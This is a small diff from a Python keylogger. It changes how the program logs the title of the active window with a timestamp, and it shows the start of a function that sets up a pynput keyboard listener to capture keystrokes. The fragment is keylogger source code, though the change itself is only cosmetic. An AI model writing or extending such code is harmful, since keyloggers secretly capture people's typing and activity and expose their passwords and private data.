@@ -53,7 +53,7 @@ def Checkifwindowchanged():
 			activewindow = wg.GetWindowText(wg.GetForegroundWindow())
 			if cwindow != activewindow :
 				cwindow = activewindow
-				logdata = logdata + '\n' + cwindow + time.ctime() + '\n'
+				logdata = logdata + '\n' + cwindow + " "+time.ctime() + '\n'
  
 def startkeylogger():  
 	kbdlisten = pynput.keyboard.Listener(on_press=onpressevent)
